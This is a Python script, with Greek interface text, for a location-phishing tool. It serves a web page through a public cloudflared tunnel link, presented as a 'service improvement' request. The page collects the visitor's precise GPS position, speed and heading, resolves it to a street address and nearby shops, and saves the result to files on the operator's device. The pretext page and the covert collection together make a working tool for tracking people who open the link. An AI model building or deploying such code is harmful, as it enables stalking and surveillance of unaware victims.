import os
import sys
import json
import subprocess
import re
import logging
import time
from threading import Thread
from datetime import datetime

# --- Έλεγχος εξαρτήσεων ---

def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
    except subprocess.CalledProcessError as e:
        print(f"[ΣΦΑΛΜΑ] Αποτυχία εγκατάστασης {package}: {e}", file=sys.stderr)
        sys.exit(1)

def check_dependencies():
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο.", file=sys.stderr)
        print("Εγκατάσταση: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port):
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"\n🔗 Δημόσιος Σύνδεσμος: {match.group(0)}\n")
            sys.stdout.flush()
            break
    process.wait()

# --- Εισαγωγές ---
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic

# --- ΡΥΘΜΙΣΕΙΣ ---
LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/Locations')
os.makedirs(LOCATION_FOLDER, exist_ok=True)

logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)

# --- ΓΕΩΕΝΤΟΠΙΣΜΟΣ ---
geolocator = Nominatim(user_agent="fast_location_app")

def process_and_save_location(data):
    try:
        lat, lon = data['latitude'], data['longitude']

        # Διεύθυνση
        full_address = "Μη διαθέσιμη"
        address_details = {}
        try:
            location = geolocator.reverse((lat, lon), language='el', exactly_one=True, timeout=10)
            if location and hasattr(location, 'raw') and 'address' in location.raw:
                address_details = location.raw.get('address', {})
                full_address = location.address
        except Exception:
            pass

        # Κοντινά καταστήματα (2 πιο κοντινά)
        places = get_nearby_places(lat, lon, limit=2)

        # IP Τοποθεσία
        ip_info = get_ip_info()

        # JSON
        pretty_data = {
            "GPS Coordinates": {
                "Latitude": lat,
                "Longitude": lon,
                "Accuracy (m)": data.get("accuracy"),
                "Altitude (m)": data.get("altitude"),
                "Speed (m/s)": data.get("speed"),
                "Heading (°)": data.get("heading")
            },
            "Address": {
                "House Number": address_details.get("house_number"),
                "Street": address_details.get("road"),
                "Suburb": address_details.get("suburb"),
                "City": address_details.get("city"),
                "State": address_details.get("state"),
                "Postcode": address_details.get("postcode"),
                "Country": address_details.get("country")
            },
            "Full Address": full_address,
            "Nearby Places (Top 2)": [
                {
                    "Type": p.get("type", "Άγνωστο").title(),
                    "Name": p.get("name", "Χωρίς Όνομα"),
                    "Address": p.get("address") or "N/A",
                    "Distance": f"{p['distance_m']} μ" if 'distance_m' in p else "N/A"
                }
                for p in places
            ],
            "IP Location": {
                "IP": ip_info.get("ip"),
                "City": ip_info.get("city"),
                "Region": ip_info.get("region"),
                "Country": ip_info.get("country")
            }
        }

        date_str = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = os.path.join(LOCATION_FOLDER, f'τοποθεσία_{date_str}.json')
        with open(filename, 'w', encoding="utf-8") as f:
            json.dump(pretty_data, f, indent=4, ensure_ascii=False)

        print(f"✅ Τα δεδομένα αποθηκεύτηκαν: {filename}\n")

    except Exception as e:
        logger.error(f"Σφάλμα: {e}")


def get_ip_info():
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return {}

def get_nearby_places(latitude, longitude, radius=2000, limit=2):
    overpass_query = f"""
    [out:json];
    (
        node["shop"](around:{radius},{latitude},{longitude});
        way["shop"](around:{radius},{latitude},{longitude});
        node["amenity"~"restaurant|cafe|bar|fast_food|pharmacy|bank|supermarket"](around:{radius},{latitude},{longitude});
        way["amenity"~"restaurant|cafe|bar|fast_food|pharmacy|bank|supermarket"](around:{radius},{latitude},{longitude});
    );
    out center;
    """
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
        response.raise_for_status()
        elements = response.json().get('elements', [])
        results = []

        for element in elements:
            tags = element.get('tags', {})
            lat_elem = element.get('lat') or element.get('center', {}).get('lat')
            lon_elem = element.get('lon') or element.get('center', {}).get('lon')

            if not lat_elem or not lon_elem:
                continue

            distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
            results.append({
                "type": tags.get("shop") or tags.get("amenity"),
                "name": tags.get("name", "Χωρίς Όνομα"),
                "address": f"{tags.get('addr:street', '')} {tags.get('addr:housenumber', '')}".strip(),
                "distance_m": round(distance, 1)
            })

        results.sort(key=lambda x: x["distance_m"])
        return results[:limit]

    except requests.RequestException:
        return []

# --- FLASK ΕΦΑΡΜΟΓΗ ---
app = Flask(__name__)

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="el">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Πρόσβαση Τοποθεσίας</title>
<style>
    body{margin:0;padding:20px;background-color:#121212;color:#E0E0E0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center}
    .container{max-width:600px}h1{color:#0d6efd;font-size:2.5rem;margin-bottom:1rem}
    p{margin-bottom:2rem;font-size:1.1rem;line-height:1.6;color:#b0b3b8}
    button{padding:15px 30px;background-color:#0d6efd;color:white;border:none;border-radius:8px;cursor:pointer;font-size:1.2rem;font-weight:600;transition:background-color .2s ease,transform .2s ease;box-shadow:0 4px 15px rgba(13,110,253,.4)}
    button:hover{background-color:#0b5ed7;transform:translateY(-2px)}
    button:disabled{background-color:#555;cursor:not-allowed;transform:none;box-shadow:none}
    #status{margin-top:1.5rem;font-size:1rem;height:20px;transition:color .3s ease}
</style>
</head>
<body>
<div class="container">
    <h1>Βελτίωση Υπηρεσίας</h1>
    <p>Για καλύτερη εμπειρία, η εφαρμογή χρειάζεται πρόσβαση στην τοποθεσία σας.</p>
    <button id="locationButton" onclick="requestLocation()">Μοιράσου την Τοποθεσία</button>
    <div id="status"></div>
</div>
<script>
    const statusEl = document.getElementById('status');
    const buttonEl = document.getElementById('locationButton');
    async function sendLocationToServer(position) {
        const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading
        };
        fetch('/save_location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(locationData)
        });
    }
    async function requestLocation() {
        buttonEl.disabled = true;
        statusEl.style.color = '#ffc107';
        statusEl.textContent = 'Αίτημα τοποθεσίας...';
        if (!navigator.geolocation) {
            statusEl.style.color = '#dc3545';
            statusEl.textContent = 'Η γεωτοποθεσία δεν υποστηρίζεται.';
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (fastPosition) => {
                statusEl.style.color = '#28a745';
                statusEl.textContent = 'Η τοποθεσία λήφθηκε. Γίνεται βελτίωση ακρίβειας...';
                sendLocationToServer(fastPosition);
                navigator.geolocation.getCurrentPosition(
                    (accuratePosition) => {
                        statusEl.textContent = 'Η ακρίβεια βελτιώθηκε!';
                        sendLocationToServer(accuratePosition);
                        buttonEl.disabled = false;
                    },
                    () => {
                        statusEl.textContent = 'Η αρχική τοποθεσία αποθηκεύτηκε.';
                        buttonEl.disabled = false;
                    },
                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                );
            },
            (err) => {
                statusEl.style.color = '#dc3545';
                statusEl.textContent = `Σφάλμα: ${err.message}`;
                buttonEl.disabled = false;
            },
            { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
        );
    }
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save_location', methods=['POST'])
def save_location():
    data = request.get_json(force=True)
    if not data or 'latitude' not in data:
        return jsonify({"error": "Μη έγκυρα δεδομένα τοποθεσίας."}), 400

    processing_thread = Thread(target=process_and_save_location, args=(data,))
    processing_thread.daemon = True
    processing_thread.start()
    return jsonify({"message": "Η τοποθεσία λήφθηκε."}), 202

# --- ΚΥΡΙΑ ΕΚΤΕΛΕΣΗ ---
if __name__ == '__main__':
    check_dependencies()
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4040
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port)
    except KeyboardInterrupt:
        print("\nΤερματισμός...")
        sys.exit(0)
    except Exception as e:
        print(f"\nΠαρουσιάστηκε σφάλμα: {e}")
        sys.exit(1)

